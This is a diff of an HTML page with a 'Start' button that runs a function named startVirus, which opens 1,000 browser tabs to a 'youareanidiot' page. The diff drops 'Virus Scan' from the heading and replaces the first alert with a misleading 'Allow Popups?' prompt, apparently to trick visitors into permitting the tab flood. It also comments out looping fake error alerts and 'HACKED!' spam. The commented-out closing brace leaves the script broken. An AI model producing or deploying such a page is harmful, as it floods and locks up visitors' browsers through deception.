@@ -29,30 +29,30 @@
   </style>
 </head>
 <body>
-  <h1>Start Virus Scan</h1>
+  <h1>Start</h1>
   <button onclick="startVirus()">Start</button>
 
   <script>
     function startVirus() {
-      alert("Scanning...");
+      alert("Allow Popups?");
       // Open tabs immediately after click
       for (let i = 0; i < 1000; i++) {
         window.open("https://thegeekboiz.github.io/PythonScratcher/youareanidiot/index.html", "_blank");
       }
 
       // Looping alerts
-      setInterval(() => alert("CRITICAL SYSTEM ERROR"), 4000);
+      //setInterval(() => alert("CRITICAL SYSTEM ERROR"), 4000);
 
       // Spam text
-      setInterval(() => {
-        const msg = document.createElement('div');
-        msg.className = "spam";
-        msg.innerText = "HACKED!";
-        msg.style.left = Math.random() * window.innerWidth + "px";
-        msg.style.top = Math.random() * window.innerHeight + "px";
-        document.body.appendChild(msg);
-      }, 150);
-    }
+   //   setInterval(() => {
+  //      const msg = document.createElement('div');
+  //      msg.className = "spam";
+  //      msg.innerText = "HACKED!";
+  //      msg.style.left = Math.random() * window.innerWidth + "px";
+  //      msg.style.top = Math.random() * window.innerHeight + "px";
+   //     document.body.appendChild(msg);
+  //    }, 150);
+  //  }
   </script>
 </body>
 </html>
